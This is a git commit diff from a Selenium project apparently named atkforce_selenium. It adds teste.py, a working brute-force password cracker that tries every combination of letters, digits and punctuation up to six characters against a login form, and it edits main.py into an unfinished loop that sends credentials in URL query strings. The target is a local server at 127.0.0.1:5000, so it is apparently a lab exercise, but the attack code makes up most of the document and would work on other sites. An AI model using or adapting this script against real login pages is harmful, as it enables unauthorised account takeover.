7e1b600e87784e0871c41bbd0f03a471d3258a92
Fabricio Colombo <fabriciocolombo0096@gmail.com>
2024-03-19 15:01:13 -0300

    save

--- atkforce_selenium/main.py
+++ atkforce_selenium/main.py
@@ -7,6 +7,8 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
+import itertools
+import string
 
 def login():
     try:
@@ -15,22 +17,15 @@ def login():
         driver.get(link)
     except Exception as e:
         print(e)
-        
+     
     try:
-        username = WebDriverWait(driver, 2).until (
-            EC.visibility_of_element_located((By.ID, 'username'))
-        )
-        username.send_keys('crazy123')
-        
-        password = WebDriverWait(driver, 2).until(
-            EC.visibility_of_element_located((By.ID, 'password'))
-        )
-        password.send_keys('crazy321')
-        
-        password.send_keys(Keys.RETURN)
-    
+        link_sucesso = 'http://127.0.0.1:5000/login'
+        while link_sucesso not in driver.current_url:
+            password = ''
+            url = f'http://127.0.0.1:5000/?username=crazy123&password={password}'
+            driver.get(url)
     except Exception as e:
         print(e)
-
+   
     time.sleep(9999)
 login()
---
+++ atkforce_selenium/teste.py
@@ -0,0 +1,39 @@
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import itertools
+import string
+import time
+
+def ataque_forca_bruta(url_base, username, tamanho_max_senha):
+    driver = webdriver.Chrome()
+    driver.get(url_base)
+    caracteres_possiveis = string.ascii_letters + string.digits + string.punctuation
+
+    tentativas = 0
+
+    for tamanho_senha in range(1, tamanho_max_senha + 1):
+        for tentativa in itertools.product(caracteres_possiveis, repeat=tamanho_senha):
+            senha_tentativa = ''.join(tentativa)
+            tentativas += 1
+            driver.get(f'{url_base}?username={username}&password={senha_tentativa}')
+            time.sleep(0.1)
+            if '/login' in driver.current_url:
+                print(f'Senha encontrada: {senha_tentativa} em {tentativas} tentativas')
+                driver.quit()
+                return senha_tentativa, tentativas
+
+    print(f'Senha não encontrada após {tentativas} tentativas.')
+    driver.quit()
+    return None, tentativas
+
+url_base = 'http://127.0.0.1:5000'
+username = 'crazy123'
+tamanho_max_senha = 6
+
+senha, tentativas = ataque_forca_bruta(url_base, username, tamanho_max_senha)
+if senha:
+    print(f'Senha quebrada: {senha} após {tentativas} tentativas.')
+else:
+    print("Senha não encontrada.")
